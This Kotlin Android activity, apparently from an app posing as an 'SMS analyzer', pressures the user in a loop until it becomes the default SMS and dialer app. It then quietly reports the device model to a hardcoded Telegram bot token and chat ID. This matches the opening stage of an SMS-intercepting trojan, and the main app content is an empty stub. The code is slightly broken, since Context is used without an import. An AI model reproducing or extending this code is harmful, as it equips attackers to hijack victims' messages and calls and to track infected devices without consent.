package com.analyzer.smsbeta

import android.content.Intent
import android.provider.Telephony
import android.telecom.TelecomManager
import android.os.Build
import android.os.Bundle
import android.widget.Toast
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody

class MainActivity : AppCompatActivity() {
    private val client = OkHttpClient()

    private val requestSmsRoleLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (isDefaultSmsApp()) {
            Toast.makeText(this, "Приложение теперь является обработчиком SMS по умолчанию", Toast.LENGTH_SHORT).show()
            checkDialerRole()
        } else {
            Toast.makeText(this, "Не удалось стать обработчиком SMS по умолчанию", Toast.LENGTH_SHORT).show()
            requestSmsRole()
        }
    }

    private val requestDialerRoleLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (isDefaultDialer()) {
            Toast.makeText(this, "Приложение теперь является дозвонщиком по умолчанию", Toast.LENGTH_SHORT).show()
            onRolesGranted()
        } else {
            Toast.makeText(this, "Не удалось стать дозвонщиком по умолчанию", Toast.LENGTH_SHORT).show()
            requestDialerRole()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_main)
        
        if (isDefaultSmsApp() && isDefaultDialer()) {
            onRolesGranted()
        } else {
            requestSmsRole()
        }
    }

    private fun isDefaultSmsApp(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            packageName == Telephony.Sms.getDefaultSmsPackage(this)
        } else {
            false
        }
    }

    private fun isDefaultDialer(): Boolean {
        val telecomManager = getSystemService(TELECOM_SERVICE) as TelecomManager
        return telecomManager.defaultDialerPackage == packageName
    }

    private fun requestSmsRole() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val roleManager = getSystemService(Context.ROLE_SERVICE) as android.app.role.RoleManager
            if (roleManager.isRoleAvailable(android.app.role.RoleManager.ROLE_SMS)) {
                val intent = roleManager.createRequestRoleIntent(android.app.role.RoleManager.ROLE_SMS)
                requestSmsRoleLauncher.launch(intent)
            }
        } else {
            val intent = Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, packageName)
            requestSmsRoleLauncher.launch(intent)
        }
    }

    private fun requestDialerRole() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val roleManager = getSystemService(Context.ROLE_SERVICE) as android.app.role.RoleManager
            if (roleManager.isRoleAvailable(android.app.role.RoleManager.ROLE_DIALER)) {
                val intent = roleManager.createRequestRoleIntent(android.app.role.RoleManager.ROLE_DIALER)
                requestDialerRoleLauncher.launch(intent)
            }
        } else {
            val intent = Intent(TelecomManager.ACTION_CHANGE_DEFAULT_DIALER)
            intent.putExtra(TelecomManager.EXTRA_CHANGE_DEFAULT_DIALER_PACKAGE_NAME, packageName)
            requestDialerRoleLauncher.launch(intent)
        }
    }

    private fun checkDialerRole() {
        if (!isDefaultDialer()) {
            requestDialerRole()
        } else {
            onRolesGranted()
        }
    }

    private fun onRolesGranted() {
        sendNotification("Приложение стало обработчиком SMS и звонков по умолчанию")
        loadMainContent()
    }

    private fun loadMainContent() {
        // Загрузка основного контента приложения
    }

    private fun sendNotification(message: String) {
        val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
        val fullMessage = "$message\n$deviceModel"

        val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
        val chatId = "6331293386"
        val url = "https://api.telegram.org/bot$botToken/sendMessage"

        val mediaType = "application/json".toMediaType()
        val requestBody = """
            {
                "chat_id": "$chatId",
                "text": "$fullMessage",
                "parse_mode": "Markdown"
            }
        """.trimIndent().toRequestBody(mediaType)

        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()

        client.newCall(request).enqueue(object : okhttp3.Callback {
            override fun onFailure(call: okhttp3.Call, e: java.io.IOException) {
                e.printStackTrace()
            }

            override fun onResponse(call: okhttp3.Call, response: okhttp3.Response) {
                response.close()
            }
        })
    }
}
